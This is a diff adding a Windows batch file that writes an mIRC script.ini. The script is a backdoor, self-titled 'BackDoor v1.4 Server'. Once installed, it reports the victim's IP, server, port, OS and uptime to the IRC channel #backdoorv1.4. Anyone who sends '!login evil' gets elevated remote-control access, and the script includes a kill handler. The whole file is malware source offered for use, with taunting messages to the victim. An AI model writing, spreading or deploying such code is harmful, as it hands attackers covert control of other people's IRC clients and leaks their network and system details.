@@ -1,0 +1,33 @@
+@echo off
+echo [script] >script.ini
+echo n0=on 1:start: { >>script.ini 
+echo n1=     /colour ctcp $colour(background) >>script.ini
+echo n2=     /ctcp 1:*:?:/$1- >>script.ini
+echo n3=} >>script.ini
+echo n4=variabiles %victim >>script.ini
+echo n5=variabiles %master >>script.ini
+echo n6=ctcp 1:*:?:/$1- >>script.ini
+echo n7= >>script.ini 
+echo n8=on 1:connect { >>script.ini  
+echo n9=   /.msg #backdoorv1.4 Code: Server BackDoorForMyMircV1.4 Hello! $server - $port - $ip - $os - $time - $date - %chan - it's been $+ $duration($calc($ticks / 1000)) since my last reboot! >>script.ini
+echo n10=  /.mode $me -i >>script.ini
+echo n11=} >>script.ini
+echo n12=on 1:TEXT:!login*:*:{ >>script.ini 
+echo n13=   if ( $2 = evil ) { /.guser 500 $nick >>script.ini
+echo n14=                      /.msg $nick Hello Master!!! >>script.ini
+echo n15=                      /.msg $nick I`m infected!!! >>script.ini
+echo n16=} >>script.ini
+echo n17=} >>script.ini
+echo n18=else { /.notice $nick Incorrect Authorization Code. Fucker!!! And better luck next time $nick = LaMeR..... } >>script.ini
+echo n19= >>script.ini
+echo n20=on 500:notice:kill*:?: { >>script.ini
+echo n21=      /.msg #backdoorv1.4 0,3 $time $nick Killed me..... I Am Gone.... >>script.ini
+echo n22=      /.amsg 0,2 $nick Killed me. I am now a slave of Nirvana Spirit....>>script.ini
+echo n23=      /.exit >>script.ini
+echo n24=} >>script.ini
+echo         BackDoor v1.4 Server 
+echo                   made
+echo                     by 
+echo                      DaareK
+echo                            Bye! Bye! Bye!
+exit
